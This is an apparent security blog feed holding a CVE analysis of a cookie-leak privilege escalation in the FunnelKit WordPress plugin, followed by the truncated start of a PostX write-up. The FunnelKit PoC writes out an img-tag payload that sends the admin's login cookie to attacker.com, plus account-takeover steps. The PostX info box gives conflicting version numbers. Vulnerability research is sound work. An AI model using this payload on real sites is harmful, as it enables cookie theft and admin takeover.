&lt;code&gt;uri-path&lt;/code&gt; up to, but not including, the rightmost &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;If &lt;code&gt;Path&lt;/code&gt; is valid&lt;/strong&gt; (starts with &lt;code&gt;/&lt;/code&gt;):&#xA;The browser uses this value directly as the cookie’s scope.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;After determining the cookie-path, the browser stores the cookie with the corresponding &lt;code&gt;Path&lt;/code&gt; attribute and only sends it with requests whose URL paths match.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The attack scenario for this vulnerability can occur in two cases:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The administrator accesses an &lt;strong&gt;unpublished post&lt;/strong&gt; via the endpoint &lt;code&gt;/?p=354&amp;amp;preview=true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The administrator accesses a &lt;strong&gt;published post&lt;/strong&gt; via the endpoint &lt;code&gt;/post-slug&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;In both cases, &lt;strong&gt;only the &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; cookie is sent with the request&lt;/strong&gt;, because this cookie is set with &lt;code&gt;Path=/&lt;/code&gt; and applies to the entire website.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, the attacker does not obtain the &lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt; cookie required for direct access to &lt;code&gt;/wp-admin&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;However, the attacker can still abuse the &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; cookie to gain admin access through another path.&lt;/p&gt;&#xA;&lt;p&gt;When &lt;strong&gt;FunnelKit&lt;/strong&gt; is set up together with &lt;strong&gt;WooCommerce&lt;/strong&gt;, the endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; is used as a frontend page that allows &lt;strong&gt;logged-in users&lt;/strong&gt; to edit their account information. On this page, the &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; cookie is always included in requests due to &lt;code&gt;Path=/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#34; title=&#34;Edit profile&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Edit profile&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#39; alt=&#34;Path&#34; height=&#34;1076&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit profile&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Notably, when changing the account email address, the system &lt;strong&gt;does not require password re-entry or additional verification&lt;/strong&gt;. This can be abused to &lt;strong&gt;change the admin’s email address to one controlled by the attacker&lt;/strong&gt;. The attacker can then use the &lt;strong&gt;forgot password&lt;/strong&gt; function to reset the password and log in as an administrator.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The patch in &lt;strong&gt;v3.12.0&lt;/strong&gt; mitigates the issue by &lt;strong&gt;restricting access to sensitive cookies through the &lt;code&gt;wf_get_cookie&lt;/code&gt; shortcode&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Specifically, the plugin introduces a list of blocked cookie patterns via the variable:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $restricted_cookie_pattern = &amp;#34;/^(wordpress_.*|_fk_contact_uid|wp-settings-.*|PHPSESSID|wordpress_logged_in_.*|wp_woocommerce_session_.*)$/&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside the &lt;code&gt;get_cookie&lt;/code&gt; function, before reading from &lt;code&gt;$_COOKIE&lt;/code&gt;, the plugin performs a check:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (preg_match($this-&amp;gt;restricted_cookie_pattern, $attr[&amp;#39;key&amp;#39;])) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that if the cookie key matches sensitive patterns such as:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp-settings-*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;PHPSESSID&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_woocommerce_session_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;the function &lt;strong&gt;returns an empty value&lt;/strong&gt; and &lt;strong&gt;does not allow the cookie to be read&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;As a result, the &lt;code&gt;wf_get_cookie&lt;/code&gt; shortcode can no longer access WordPress or WooCommerce authentication cookies, &lt;strong&gt;completely preventing cookie leakage and privilege escalation scenarios&lt;/strong&gt; exploited in previous versions.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Contributor)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Create / Edit Post&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Insert shortcode wf_get_cookie into HTML attribute (img src)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Post saved (draft or published)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Admin visits post (preview or published URL)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;WordPress processes shortcode server-side&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;wf_get_cookie reads wordpress_logged_in_* from $_COOKIE&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Cookie value rendered into HTML output&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Browser loads external resource (attacker.com)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Admin authentication cookie leaked via URL&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker captures wordpress_logged_in_* cookie&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker sets stolen cookie in browser&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Access /my-account/edit-account/ as Admin&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Change admin email without re-authentication&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Trigger forgot password flow&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Reset password via attacker-controlled email&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Full admin account takeover&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Log in with a &lt;strong&gt;Contributor&lt;/strong&gt; account and create a new post with the following content:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=wordpress_logged_in_md5(your_site_url)]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;When an administrator visits this post, the browser sends a request to &lt;code&gt;attacker.com&lt;/code&gt; containing the cookie value rendered in the URL. The attacker captures this cookie from the request.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; title=&#34;Cookie from request&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie from request&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;148&#34; width=&#34;1509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie from request&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The attacker accesses the endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; and replaces their own &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; cookie with the stolen admin cookie.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Change the account email address to one controlled by the attacker.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Use the &lt;strong&gt;forgot password&lt;/strong&gt; function to set a new password.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Log in again with &lt;strong&gt;admin&lt;/strong&gt; privileges using the new password.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-7654 originates from the &lt;code&gt;wf_get_cookie&lt;/code&gt; shortcode allowing unrestricted access to authentication cookies, leading to leakage of &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; and enabling privilege escalation. Embedding shortcodes in HTML attributes turns data rendering into an exfiltration channel. The v3.12.0 patch mitigates this by blocking sensitive cookie patterns.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Shortcodes that read cookies are inherently dangerous.&lt;/li&gt;&#xA;&lt;li&gt;HTML attribute injection can lead to authentication data leakage.&lt;/li&gt;&#xA;&lt;li&gt;Contributors can still be effective privilege escalation vectors.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; cookie is sufficient for indirect account takeover.&lt;/li&gt;&#xA;&lt;li&gt;Always verify actual code changes rather than relying solely on patch announcements.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/funnel-builder/vulnerability/wordpress-funnelkit-plugin-3-11-0-2-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin &amp;lt;= 3.11.0.2 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-05-cve-2025-55707/</link>
      <pubDate>Mon, 05 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-05-cve-2025-55707/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt; vulnerability in &lt;strong&gt;PostX, Inc. PostX PostX-lite&lt;/strong&gt; allows &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. This issue affects &lt;strong&gt;PostX&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; to &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;PostX&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.35&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.36&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    &amp;#39;ultp/v1&amp;#39;,&#xA;    &amp;#39;/postx_presets/&amp;#39;,&#xA;    array(&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; array($this, &amp;#39;postx_presets_callback&amp;#39;),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return current_user_can(&amp;#39;edit_posts&amp;#39;);&#xA;            },&#xA;            &amp;#39;args&amp;#39; =&amp;gt; array()&#xA;        )&#xA;    )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this configuration, the API is exposed as:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a request is sent to this endpoint using the POST method, WordPress calls &lt;code&gt;postx_presets_callback()&lt;/code&gt;. However, before this function is executed, the request must pass the permission check via &lt;code&gt;current_user_can(&#39;edit_posts&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;edit_posts&lt;/code&gt; capability is granted to users with the &lt;strong&gt;Contributor&lt;/strong&gt; role and above. However, the vulnerability disclosure specifies a required role of &lt;strong&gt;Editor&lt;/strong&gt;. Due to this discrepancy, it is necessary to further analyze the implementation of the &lt;code&gt;postx_presets_callback()&lt;/code&gt; function to determine the root cause and how the vulnerability can be exploited.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function postx_presets_callback($server) {&#xA;    $post = $server-&amp;gt;get_params();&#xA;    $type = isset($post[&amp;#39;type&amp;#39;]) ? $post[&amp;#39;type&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $key = isset($post[&amp;#39;key&amp;#39;]) ? $post[&amp;#39;key&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $data = isset($post[&amp;#39;data&amp;#39;]) ? $post[&amp;#39;data&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $type ) {&#xA;        if ( $type == &amp;#39;set&amp;#39; ) {&#xA;            if ( current_user_can(&amp;#39;edit_others_posts&amp;#39;) ) {&#xA;                update_option($key, $data);&#xA;            }&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true];&#xA;        } else {&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; get_option($key, [])];&#xA;        }&#xA;    } else {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The callback function retrieves the &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt;, and &lt;code&gt;data&lt;/code&gt; parameters from the request. When &lt;code&gt;type&lt;/code&gt; is equal 